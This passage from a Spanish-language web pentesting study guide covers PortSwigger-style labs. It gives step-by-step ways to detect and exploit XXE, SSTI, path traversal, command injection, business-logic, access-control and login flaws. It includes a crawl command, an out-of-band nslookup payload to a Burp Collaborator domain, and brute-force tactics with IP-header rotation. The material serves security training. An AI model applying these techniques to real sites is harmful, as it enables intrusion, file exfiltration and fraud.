- SSRF with filter bypass via open redirection vulnerability: [https://justice-reaper.github.io/posts/SSRF-Lab-5/](https://justice-reaper.github.io/posts/SSRF-Lab-5/)

## XXE injection

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un XXE?

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Collaborator Everywhere`, `Backslash Powered Scanner` y `Content Type Converter` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - Si todo va bien, el `escáner de Burpsuite` nos `detectará` el `XXE` e `inyectará` un `payload` que pueda `leer` el `/etc/passwd`

5 - Si el `paso anterior` no es posible, debemos mirar si el `escáner de Burpsuite` nos `detecta` que se puede `realizar una petición` a `Burpsuite Collaborator`, en cuyo caso `intentaremos explotar` un `SSRF`. Para ello, debemos tener en cuenta que `en el examen, el servicio se encuentra en http://localhost:6566`

6 - Si el `SSRF no funciona` y tenemos un `exploit server`, podemos `intentar exfiltrar archivos`. Para `exfiltrar archivos` tenemos que `seguir los pasos` que se realizan en este `post` [https://justice-reaper.github.io/posts/XXE-Lab-5/](https://justice-reaper.github.io/posts/XXE-Lab-5/)

7 - Si durante el `escaneo` obtenemos un `error` de este estilo, puede que podamos `aprovecharnos del error` para `exfiltrar el contenido de un archivo`. Para hacer esto tenemos que `seguir los pasos` que se realizan en este `laboratorio` [https://justice-reaper.github.io/posts/XXE-Lab-6/](https://justice-reaper.github.io/posts/XXE-Lab-6/)

```
XML parser exited with error: org.xml.sax.SAXParseException; systemId: http://4glr09mjgeqzv1y3o7st5xv7tyzznpbozfp2fq4.oastify.com; lineNumber: 1; columnNumber: 2; The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

8 - Puede que los `datos` no se envíen como `XML` sino en otro `formato` (en `application/x-www-form-urlencoded` por ejemplo) pero el `servidor los incruste en un documento XML`. Si el `escáner` lo `detecta`, es posible que podamos `explotar` un `XXE` mediante `XInclude`. Para llevar a cabo la `explotación` tenemos que `seguir los pasos` que se muestran en este `laboratorio` [https://justice-reaper.github.io/posts/XXE-Lab-7/](https://justice-reaper.github.io/posts/XXE-Lab-7/)

```
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

9 - En el caso de la `subida de archivos`, lo más probable es que el `escáner de Burpsuite` no `detecte` la `vulnerabilidad`, por lo que tendremos que `explotar` el `XXE` de `forma manual siguiendo los pasos` que se muestran en este `laboratorio` [https://justice-reaper.github.io/posts/XXE-Lab-8/](https://justice-reaper.github.io/posts/XXE-Lab-8/)

10 - Si tenemos `dudas` con los `pasos anteriores` podemos `consultar` estos `posts`:

- Exploiting XXE using external entities to retrieve files: [https://justice-reaper.github.io/posts/XXE-Lab-1/](https://justice-reaper.github.io/posts/XXE-Lab-1/)

- Exploiting XXE to perform SSRF attacks: [https://justice-reaper.github.io/posts/XXE-Lab-2/](https://justice-reaper.github.io/posts/XXE-Lab-2/)

- Blind XXE with out-of-band interaction: [https://justice-reaper.github.io/posts/XXE-Lab-3/](https://justice-reaper.github.io/posts/XXE-Lab-3/)

- Blind XXE with out-of-band interaction via XML parameter entities: [https://justice-reaper.github.io/posts/XXE-Lab-4/](https://justice-reaper.github.io/posts/XXE-Lab-4/)

- Exploiting blind XXE to exfiltrate data using a malicious external DTD: [https://justice-reaper.github.io/posts/XXE-Lab-5/](https://justice-reaper.github.io/posts/XXE-Lab-5/)

- Exploiting blind XXE to retrieve data via error messages: [https://justice-reaper.github.io/posts/XXE-Lab-6/](https://justice-reaper.github.io/posts/XXE-Lab-6/)

- Exploiting XInclude to retrieve files: [https://justice-reaper.github.io/posts/XXE-Lab-7/](https://justice-reaper.github.io/posts/XXE-Lab-7/)

- Exploiting XXE via image file upload: [https://justice-reaper.github.io/posts/XXE-Lab-8/](https://justice-reaper.github.io/posts/XXE-Lab-8/)

## SSTI

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un SSTI?

1 - `Añadir` el `dominio` y sus `subdominios` al `scope`

2 - `Iniciar sesión` si es posible y `testear manualmente todas las características` del `sitio web`. Una vez hecho esto, nos `dirigimos` al `Site map` y `revisamos todas las peticiones que se han realizado en busca de indicios de que se está utilizando una plantilla`. Debemos `revisar manualmente` estas `peticiones` en busca de patrones como {% raw %}`${`, `{{` o `user.nickname`{% endraw %}. Este tipo de `sintaxis` o de `objetos` suele `indicar` que nuestro `input` está siendo `procesado` por un `motor de plantillas`. Debemos `tener en cuenta que hay diferentes motores de plantillas y sus sintaxis son diferentes`

3 - Si el `input` que introducimos se `muestra` en la `misma página` en la que lo `introducimos`, `enviaremos` la `petición` al `Intruder` de `Burpsuite` y usaremos estos `payloads` [https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz) para `comprobar si podemos ejecutar comandos`

4 - En caso de que lo anterior `falle` o de que tengamos que `inyectar` en un `sitio` y `visualizar` lo que hemos `inyectado` en `otro sitio` distinto, usaremos los `payloads` de esta `tabla` [https://cheatsheet.hackmanit.de/template-injection-table/](https://cheatsheet.hackmanit.de/template-injection-table/) para `detectar` el `motor de plantillas` que se está usando. Un ejemplo de este último caso lo podemos ver en este `laboratorio` [https://justice-reaper.github.io/posts/SSTI-Lab-2/](https://justice-reaper.github.io/posts/SSTI-Lab-2/)

5 - Una vez `identificada` la `plantilla`, vamos a intentar `ejecutar comandos` usando los `payloads` de `Hacktricks` [https://hacktricks.wiki/es/pentesting-web/ssti-server-side-template-injection/index.html](https://hacktricks.wiki/es/pentesting-web/ssti-server-side-template-injection/index.html) y de `PayloadsAllTheThings` [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). Hay casos, como el de este `laboratorio` [https://justice-reaper.github.io/posts/SSTI-Lab-5/](https://justice-reaper.github.io/posts/SSTI-Lab-5/), en los que tenemos que `buscar información` que pueda resultar crítica en `otras páginas`, como esta [https://www.wallarm.com/what/server-side-template-injection-ssti-vulnerability](https://www.wallarm.com/what/server-side-template-injection-ssti-vulnerability) o en la `documentación` de la `plantilla` [https://docs.djangoproject.com/en/5.1/ref/settings/](https://docs.djangoproject.com/en/5.1/ref/settings/)

6 - Si hemos logrado `identificar el motor de plantillas` pero `no conseguimos ejecutar comandos`, buscaremos `exploits documentados` o `vulnerabilidades conocidas` para esa `plantilla`, como ocurre en este `laboratorio` [https://justice-reaper.github.io/posts/SSTI-Lab-4/](https://justice-reaper.github.io/posts/SSTI-Lab-4/). Si no encontramos ninguno, `revisaremos su documentación` para ver si podemos `aprovecharnos de alguna característica` que nos permita `obtener información sensible`, como podemos ver en este `laboratorio` [https://justice-reaper.github.io/posts/SSTI-Lab-3/](https://justice-reaper.github.io/posts/SSTI-Lab-3/)

7 - Si tenemos dudas con los pasos anteriores podemos consultar estos posts:

Basic server-side template injection: [https://justice-reaper.github.io/posts/SSTI-Lab-1/](https://justice-reaper.github.io/posts/SSTI-Lab-1/)

Basic server-side template injection (code context): [https://justice-reaper.github.io/posts/SSTI-Lab-2/](https://justice-reaper.github.io/posts/SSTI-Lab-2/)

Server-side template injection using documentation: [https://justice-reaper.github.io/posts/SSTI-Lab-3/](https://justice-reaper.github.io/posts/SSTI-Lab-3/)

Server-side template injection in an unknown language with a documented exploit: [https://justice-reaper.github.io/posts/SSTI-Lab-4/](https://justice-reaper.github.io/posts/SSTI-Lab-4/)

Server-side template injection with information disclosure via user-supplied objects: [https://justice-reaper.github.io/posts/SSTI-Lab-5/](https://justice-reaper.github.io/posts/SSTI-Lab-5/)

## Path traversal

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un path traversal?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Lanzaremos katana para crawlear toda la web y obtener así todas las rutas`. Es `importante` que nos `fijemos` en `rutas` como `?filename=1.jpg`, o `si llevan una ruta inicial como en este caso ?filename=/var/www/images/1.jpg`. `Básicamente tenemos que tener en cuenta todas las URLs en las que vemos que se carga un archivo mediante un parámetro de consulta`. `Si las cookies no hacen falta, eliminamos ese parámetro`

```
katana -u https://0ab7005203fcd9e4803a94dc00a200cd.web-security-academy.net -H "Cookie: session=NUESTRAS_COOKIES" -jc -jsl -fx -kf all -xhr -d 3 -silent -f qurl | sort -u > params.txt
```

2 - Una vez tenemos esto, `vamos a hacer una petición a las rutas que nos interesaen y a efectuar un ataque con el Intruder de Burpsuite`. Como `diccionario` vamos a usar este [https://raw.githubusercontent.com/coffinxp/loxs/refs/heads/main/payloads/lfi.txt](https://raw.githubusercontent.com/coffinxp/loxs/refs/heads/main/payloads/lfi.txt). Es `muy importante` que `desactivemos el Payload encoding porque de los contrario, no funciará correctamente el ataque` y `támbien debemos modificar la configuración un poco para no mandar demasiadas solicitudes y tirar la web`. Otra cosa también importante es que `el payload siempre se inyecta en la posición en la que se encuentra el archivo que se carga`, es decir, `si tenemos esto ?filename=/var/www/images/1.jpg, nuestro payload va donde está el 1.jpg y la ruta /var/www/images/ se deja intacta`. Y por último, `respecto al ataque que usa el null byte %00`, `el diccionario solo contempla una serie de extensiones, por lo que puede que necesitemos cambiar una de las extensiones por la que necesitemos`. `Esto se puede hacer fácilmente con una regex o manualmente, yo recomiendo sustituir la extensión .jpg`

3 - `Mientras se hace el ataque, vamos a filtrar por root: porque ese usuario siempre se encuentra en el /etc/passwd`. La `cadena completa` que deberíamos `ver` es esta `root:x:0:0:root:/root:/bin/bash` o `una muy parecida`. `También podemos filtrar por el Content-Length pero el resultado es menos fiable`

## OS command injection

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un command injection?

1 - `Instalar` las extensión `Agartha` de `Burpsuite`

2 - `Lo primero que tenemos que hacer es detectar el command injection`, para ello vamos a `generar payloads` usando el `comando sleep 5` con la `extensión Agartha` y `mediante el Intruder vamos a efectuar un Battering ram attack`. `Vamos a introducir los payloads generados en todas las posiciones posibles`, por ejemplo, `en un formulario o cuando checkeamos el stock de un producto se envían cammpos con sus valores, pues nosotros capturamos este tipo de peticiones con Burspuite y sustituimos esos datos`. `Antes de iniciar el ataque debemos tener en cuenta que puede ser que hayan posiciones en las que no podamos introducir un payload porque provocaríamos un error, por ejemplo, si reemplazamos un token csrf lo más seguro es que provoquemos un error`. En estos casos, lo que tenemos que hacer es `quitar los payloads de las posiciones uno a uno para poder ver cual es la posición en la que no podemos inyectar payloads`. Otra cosa importante, `tenemos que usar un solo hilo, poner un tiempo fijo entre peticiones (200 milisegundos por ejemplo) y desactivar el payload encoding`. Si queremos `payload encoding` lo hacemos desde la `extensión Agartha`, `no desde el Intruder`

3 - `Si no encontramos nada puede ser porque estemos ante un blind command injection with out-of-band interaction`, para estos casos tenemos que `copiarnos un dominio de Burpsuite Collaborator` y `usarlo en este comando nslookup npg6x2n5ukokq7409k2zmzwl8ce32tqi.oastify.com para generar un diccionario de payloads`. Este `diccionario` lo vamos a `guardar` en una `ruta de nuestro sistema` y posteriormente vamos a `ejecutar estos comandos para así añadirle un identificador único a cada payload y así saber que payload corresponde cada petición que recibamos en Burpsuite Collaborator`. Una vez tengamos el `diccionario creado`, `efectuamos un Battering ram attack e introducimos los payloads en todas las posiciones posibles`. `Para este tipo de payloads no necesitamos modificar el número de hilos, lo podemos dejar por defecto`

```
d="npg6x2n5ukokq7409k2zmzwl8ce32tqi.oastify.com"
awk -v d="$d" 'index($0,d){ n++; sub(d, n"."d) } 1' payloads.txt | sponge payloads.txt
```

4 - `En caso de que los pasos anteriores no funcionen`, vamos a `repetirlos` pero `seleccionando` la `opción` de `URL encoding` en `Agartha`

5 - `En caso de que esto tampoco funcione, podemos intentar hacer los pasos que se mencionan a continuación, sin embargo, lo más probable es que no exista un command injection en este laboratorio`. `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `Backslash Powered Scanner` y `Command injection attacker` de `Burpsuite`

6 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `Backslash Powered Scanner` y `Command injection attacker` de `Burpsuite`

7 - `Añadir` el `dominio` y sus `subdominios` al `scope`

8 - `Interactuar con toda la web manualmente` y `hacer` un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

9 - `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos `seleccionar` en `tipo de escaneo` la opción `Audit selected items`

10 - Una vez hayamos `detectado` el `command injection`, ya podremos `ejecutar comandos` en la `máquina víctima`. Para `completar` los `laboratorios` vamos a tener que `leer` un `archivo`, `existen diferentes formas de lograrlo`, por ejemplo`, puede ser que podamos ver el output del comando en la respuesta` [https://justice-reaper.github.io/posts/Command-Injection-Lab-1/](https://justice-reaper.github.io/posts/Command-Injection-Lab-1/), `puede ser que tengamos que copiar el contenido del archivo que queramos leer en una ruta a la que tengamos acceso` [https://justice-reaper.github.io/posts/Command-Injection-Lab-3/](https://justice-reaper.github.io/posts/Command-Injection-Lab-3/) o `puede ser que tengamos que exfiltrar el contenido del archivo` [https://justice-reaper.github.io/posts/Command-Injection-Lab-5/](https://justice-reaper.github.io/posts/Command-Injection-Lab-5/)

## Vulnerabilidades de lógica de negocio

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de lógica de negocio?

1 - `Añadir` el `dominio` y sus `subdominios` al `scope`

2 - `Iniciar sesión` si es posible, `interactuar con todas las funcionalidades` del `sitio web` e `inspeccionar` las `peticiones` que hay en el `Site map`

3 - Intentar `cambiarle` el `precio` a los `productos` al `añadirlos` a la `cesta` y probar también a `hacerlo desde la cesta`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-1/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-1/)

4 - Intentar `añadir` una `cantidad negativa` de `productos` a la `cesta` y probar también a `hacerlo desde la cesta`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-2/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-2/)

5 - Intentar `cambiar nuestro email a uno corporativo` para ver si `ganamos acceso` a `paneles administrativos` o a `funcionalidades avanzadas`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-3/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-3/)

6 - `Intercalar cupones`, es decir, `canjear primero uno`, `luego otro` y `comprobar si podemos usar de nuevo el primero`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-4/)

7 - `Encontrar el número máximo de productos que podemos añadir a la cesta a la vez`, 99 por ejemplo y ver si `el precio se vuelve negativo al llegar a cierta cantidad`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-5/)

8 - `Escribir el número máximo de caracteres posible en los campos de texto` y `si desde el lado del cliente se nos establece un límite usaremos Burpsuite`. También podemos `introducir el máximo número de caracteres posibles a la hora de registrarnos con un email`, ya que `si el límite de caracteres del input es mayor que el de la columna de la base de datos se produce un truncamiento`. De esta forma, un `email demasiado largo terminado en un dominio corporativo` puede `almacenarse recortado` y quedar como una `dirección válida de ese dominio`, lo que nos permitiría `acceder a funcionalidades restringidas` como un `panel de administración`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-6/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-6/)

9 - Probar a `eliminar campos a la hora de cambiar una contraseña` por ejemplo, y `si no podemos borrar el campo completo borraremos su valor solamente`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-7/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-7/)

10 - `Intentar romper el workflow`, un ejemplo de esto sería `añadir un producto a la cesta y comprarlo`. En este caso `se nos descontaría el dinero`, pero para ello `se realizarían 2 peticiones`, `una para descontar el dinero y otra para comprar el producto`, `si dropeamos la primera y solo enviamos la segunda petición, obtendríamos el producto gratis`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-8/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-8/)

11 - Cuando tengamos la opción de `elegir el privilegio de nuestro usuario`, `podemos intentar evitarlo dropeando la petición que nos asigna el nivel de privilegio y de esta manera obtener uno por defecto`, el cual podría ser el `administrativo`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-9/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-9/)

12 - Si podemos `comprar una tarjeta regalo` aplicando un `código de descuento`, podremos `canjearla` después por su `valor completo`. Como la hemos `comprado más barata gracias al descuento` pero `recibimos su valor íntegro`, `ganamos más dinero del que gastamos`, y `repitiendo el proceso podemos aumentar nuestro saldo de forma ilimitada`. Este proceso se puede `automatizar` mediante las `macros de Burpsuite`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-10/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-10/)

13 - Si `controlamos` una `cookie`, un `input` u `otra cosa` que esté siendo `cifrada y descifrada`, podemos ver si `alguna cookie emplea el mismo algoritmo` y así `construir la nuestra propia para acceder a la cuenta de otro usuario o escalar privilegios`. Esto ocurre porque la aplicación nos expone un `oracle de cifrado`, es decir, una `funcionalidad que cifra datos que nosotros controlamos` y `otra que los descifra`, de modo que `podemos reutilizar y manipular esos valores cifrados para forjar una cookie válida sin conocer la clave`. Como normalmente se emplea un `cifrado por bloques`, debemos `mantener los bloques alineados a su tamaño` (por ejemplo, `múltiplos de 16 bytes`) para que el `descifrado no se corrompa`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-11/](https://justice-reaper.github.io/posts/Business-Logic-Vulnerabilities-Lab-11/)

## Information disclosure

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un information disclosure?

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Iniciamos sesión si podemos`, `interactuamos con todas las características del sitio web manulamente` y `hacemos` un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - Es `muy importante` que `miremos todo lo que detecta el escáner de Burpsuite`, ya que nos puede `detectar` el `archivo robots.txt`, `rutas o archivos de backups`, `errores que se produzcan y desvelen información`, `archivos phpinfo`, el `método TRACE`. Respecto al `método TRACE`, `el servidor web responderá a las peticiones que usen el método TRACE repitiendo en la respuesta la petición exacta que recibió`. Esto puede hacer que `veamos cabeceras interesantes que nos permitan acceder a rutas como /admin`

5 - Usaremos `ffuf` para encontrar `rutas` junto con el diccionario `common.txt` de `seclists` para `encontrar` archivos como `phpinfo.php` o archivos de `backup`. En el caso del `phpinfo.php` deberemos buscar el `valor` de `secret_key`, en el `backup` puede que `encontremos` una `contraseña` de `base de datos` y si `encontramos` un `.git` deberemos usar `git-dumper` para descargarlo, posteriormente deberemos acceder al directorio `.git`, usar `git log` para `listar` los `commits` y luego usar `git show nombreDelCommit` para `ver` los `cambios realizados`. Si encontramos un directorio `/admin` al cual no podemos acceder porque nos `devuelve` un `401` usaremos la herramientas `Byp4xx` intentar `bypassear` la `restricción`

6 - `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`. También podemos hacerlo de `forma manual`, `cambiando el tipo de dato esperado por un parámetro`, es decir, si vemos un `parámetro que necesita un número, como ?productId=1`, podemos `pasarle texto o caracteres especiales para ver si produce algún error`

## Broken access control

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un broken access control?

1 - `Añadir` el `dominio` y sus `subdominios` al `scope`

2 - `Crawleamos` el `dominio` con `Burpsuite`

3 - Nos `logueamos` si podemos e `interactuamos manualmente` con todas las `funcionalidades` del `sitio web`

4 - Al `loguearnos` se nos `redirigirá` a una `ruta` como esta `/my-account?id=wiener`. En estos casos, vamos a probar si podemos `visualizar la información` de `otro usuario` accediendo a `/my-account?id=carlos`

5 - Puede ser que en vez de un `usuario`, vemamos un `GUID` así `/my-account?id=bdb7ff58-939d-42a9-91d3-b44348df2eb6`. Para estos casos lo primero que vamos a ver es si hay `artículos publicados` y si es así puede ser también haya `comentarios` y/o el `autor del post`. Una vez hayamos encontrado esto vamos a `inspeccionar esa página` para ver si podemos ver el `GUID` de esos `usuarios`. En caso de que sí podamos ver el `GUID`, vamos a intentar `visualizar sus perfiles` accediendo así `/my-account?id=b7d5d6b3-89d4-4d9f-9ef2-6f4e9e34a8c1`

6 - Hay veces que al intentar `visualizar el perfil` de `otro usuario` no vamos a poder, porque al acceder a su perfil se va a realizar un `redirect`. Sin embargo, es posible `evitar el redirect` si hacemos la `petición` a `/my-account?id=carlos` mediante `Burpsuite`

7 - `Fuzzear rutas` usando `ffuf` y el diccionario `common.txt` de `seclists` para ver si encontramos `rutas interesantes`, como `/admin`

8 - `Inspeccionar el código fuente` de la web y los `archivos .js` en busca de `rutas interesantes` o `contraseñas hardcodeadas`. Para buscar `rutas` podemos usar la función `find scripts` que tiene `Burpsuite`, para usarla hacemos `click derecho` sobre el `dominio` > `Engagements tools` > `Find scripts`. Por ejemplo, una `ruta de usuario administrador` con un `nombre aleatorio` como `/admin-zxsf`

9 - Vamos a buscar `valores` como de este estilo `roleid:1`, `admin: false` tanto en el `Site map` como en el `HTTP history`. Una vez los tengamos vamos a probar a `cambiarlos` para ver si hacíendolo también podemos `cambiar nuestros privilegios` y así acceder a `rutas` a las que solo un `usuario administrador` podría acceder. Estos `valores` pueden aparecer tanto en las `requests` como en las `responses` en lugares como las `cookies` o en el `body`

10 - Si tenemos `dos cuentas` con diferente `nivel de privilegio` podemos intentar `replicar las peticiones` que se hacen en la `cuenta de mayor privilegio` en la `cuenta con menores privilegios`. Podemos cambiar el `método` de `GET` a `POST` o vicebersa para intentar `bypassear ciertos controles` que se estén haciendo y así poder `ejecutar estas peticiones`. En otras ocasiones, simplmente con cambiar la `cookie` del `usuario con mayor privilegio` por la del `usuario con menor privilegio` es suficiente para llevar a cabo la `explotación`

Si tenemos dudas con los pasos anteriores podemos consultar estos posts:

- Unprotected admin functionality - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-1/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-1/)

- Unprotected admin functionality with unpredictable URL - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-2/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-2/)

- User role controlled by request parameter - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-3/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-3/)

- User role can be modified in user profile - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-4/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-4/)

- User ID controlled by request parameter - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-5/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-5/)

- User ID controlled by request parameter, with unpredictable user IDs - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-6/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-6/)

- User ID controlled by request parameter with data leakage in redirect - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-7/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-7/)

- User ID controlled by request parameter with password disclosure - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-8/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-8/)

- Insecure direct object references - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-9/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-9/)

- URL-based access control can be circumvented - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-10/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-10/)

- Method-based access control can be circumvented - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-11/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-11/)

- Multi-step process with no access control on one step - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-12/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-12/)

- Referer-based access control - [https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-13/](https://justice-reaper.github.io/posts/Broken-Access-Control-Lab-13/)

## Vulnerabilidades de autenticación

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar una vulnerabilidad de autenticación?

1 - Instalar las extensiones `Param Miner` y `Random IP Address Header` de `Burpsuite`

2 - Añadir el `dominio` y sus `subdominios` al `scope`

3 - Interactuar con todas las `funcionalidades` del `sitio web` e inspeccionar las `peticiones` que aparecen en el `Site map`

4 - Los `diccionarios` que emplearemos a lo largo de estos pasos serán este `diccionario de nombres de usuario` [https://portswigger.net/web-security/authentication/auth-lab-usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames) para los `usuarios` y este `diccionario de contraseñas` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) para las `contraseñas`, de modo que no tengamos que mencionarlos en cada punto

5 - Si disponemos de un `panel de login`, vamos a `bruteforcear usuarios` con el `Intruder` y el `diccionario de nombres de usuario`. A continuación, aplicaremos un `Grep - Extract` sobre el `mensaje` que se muestra cuando un `usuario` es `incorrecto`, con el fin de detectar `posibles variaciones` en la `respuesta` que delaten un `usuario válido`. Si descubrimos alguno, `bruteforcearemos` su `contraseña` con el `diccionario de contraseñas`. Si tenemos `dudas` con esto, podemos `leernos` estos `posts` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-1/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-1/) y [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-4/)

6 - Otra forma de `bruteforcear` el `login` es la siguiente. Si mientras realizamos lo anterior el `servidor` nos devuelve un `timeout`, emplearemos la opción `Guess headers` de la extensión `Param Miner` para comprobar si podemos `bypassearlo` mediante alguna `cabecera`

Hecho esto, verificaremos si al `loguearnos` con un `usuario válido` que conozcamos (como `wiener`) y una `contraseña muy larga` con `valores aleatorios`, el `servidor` tarda más de lo normal en devolvernos el `error`, asegurándonos de que esto solo ocurre con los `usuarios válidos`

Una vez confirmado, enviamos la `petición` al `Intruder`, seleccionamos el `modo de ataque Pitchfork` y marcamos `dos posiciones`, una para la `dirección IP` que proporcionaremos a la `cabecera` y otra para el `valor del campo username`. Las `direcciones IP` las generamos con la herramienta `ip-range-generator`. Al igual que antes, aplicaremos un `Grep - Extract` sobre el `mensaje de error` para observar las `variaciones`

